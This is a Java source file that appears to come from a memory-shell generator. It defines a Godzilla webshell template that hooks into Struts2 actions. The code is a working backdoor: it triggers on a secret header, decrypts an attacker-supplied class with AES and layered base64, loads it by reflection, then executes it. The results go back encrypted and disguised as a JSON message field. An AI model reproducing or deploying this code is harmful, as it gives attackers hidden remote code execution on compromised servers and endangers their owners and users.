package com.reajason.javaweb.memshell.shelltool.godzilla.hw;

import java.io.ByteArrayOutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

/**
 * Godzilla HW Action 模板（JAVA_AES_BASE64_PRO）。
 * <p>
 * 只包含当前加密器的协议，由 {@link GodzillaHwGenerator} 按配置选择；
 * 请求/响应统一通过反射访问，容器钩子只需传入 request/response。
 *
 * @author ReaJason
 */
public class GodzillaHwActionPro {
    private static String key;
    private static String pass;
    private static String headerName;
    private static String headerValue;
    private static Class<?> payload;

    public GodzillaHwActionPro() {
    }

    @SuppressWarnings("all")
    public void execute() throws Exception {
        try {
            Class<?> clazz = Class.forName("com.opensymphony.xwork2.ActionContext");
            Object context = clazz.getMethod("getContext").invoke(null);
            Method getMethod = clazz.getMethod("get", String.class);
            HttpServletRequest request = (HttpServletRequest) getMethod.invoke(context,
                    "com.opensymphony.xwork2.dispatcher.HttpServletRequest");
            HttpServletResponse response = (HttpServletResponse) getMethod.invoke(context,
                    "com.opensymphony.xwork2.dispatcher.HttpServletResponse");
            run(request, response);
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    public Class<?> reflectionDefineClass(byte[] classBytes) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defMethod.setAccessible(true);
        return (Class<?>) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
    }

    @SuppressWarnings("all")
    private boolean run(Object request, Object response) throws Exception {
        String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
        if (value == null || !value.contains(headerValue)) {
            return false;
        }
        String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, "loginCa");
        byte[] data = x(radomDecrypt(parameter), false);
        if (payload == null) {
            payload = reflectionDefineClass(data);
            return true;
        }
        PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
        try {
            writer.write("{\"msg\":\"" + radomEncrypt(x(execute(request, data), true)) + "\"}");
        } catch (Throwable e) {
            writer.write(getErrorMessage(e));
        }
        writer.flush();
        writer.close();
        return true;
    }

    @SuppressWarnings("all")
    private static byte[] execute(Object request, byte[] data) throws Exception {
        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
        Object f = payload.newInstance();
        f.equals(arrOut);
        f.equals(request);
        f.equals(data);
        f.toString();
        return arrOut.toByteArray();
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        try {
            Object encoder = Class.forName("java.util.Base64").getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            Object encoder = Class.forName("sun.misc.BASE64Encoder").newInstance();
            return (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
        }
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }
    @SuppressWarnings("all")
    public byte[] x(byte[] s, boolean m) throws Exception {
        Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
        cipher.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"),
                new javax.crypto.spec.IvParameterSpec(pass.getBytes("UTF-8")));
        return cipher.doFinal(s);
    }
    private static String reverse(String value) {
        return new StringBuilder(value).reverse().toString();
    }

    @SuppressWarnings("all")
    private static String radomEncrypt(byte[] bytes) throws Exception {
        byte[] tmp = bytes;
        int num = bytes.length > 512000 ? 1 : (int) (Math.random() * 8.0 + 2.0);
        for (int i = 0; i < num; i++) {
            tmp = ("sign:" + reverse(base64Encode(tmp))).getBytes();
        }
        return base64Encode(tmp);
    }

    @SuppressWarnings("all")
    private static byte[] radomDecrypt(String value) throws Exception {
        byte[] tmp = base64Decode(value);
        while (new String(tmp).startsWith("sign:")) {
            tmp = base64Decode(reverse(new String(tmp).substring(5)));
        }
        return tmp;
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }

}
